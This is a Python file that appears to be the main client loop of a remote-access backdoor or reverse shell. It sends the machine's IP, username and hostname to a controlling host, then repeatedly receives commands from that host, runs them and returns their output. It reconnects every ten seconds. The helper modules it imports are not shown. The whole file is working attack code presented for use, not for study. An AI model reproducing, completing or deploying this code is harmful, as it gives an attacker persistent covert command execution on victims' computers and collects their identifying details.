from time import sleep
from controllers.client_controllers.communicator import Communicator
from controllers.client_controllers.commander import Commander


def main() -> None:
	# new instance to execute commands
	commander = Commander()
	# new instance to communicate with host
	communicator = Communicator()
	# send client ip, username, and hostname
	communicator.send(communicator.client_details)
	while True:
		# located current working directory
		current_directory = commander.current_directory()
		# send working directory location back to host
		communicator.send(current_directory)
		# wait for command message from host
		command = communicator.listen()
		# execute received command
		command_output = commander.run(command)
		# send output from ran command back to host
		communicator.send(command_output)


if __name__ == "__main__":
	while True:
		main()
		sleep(10)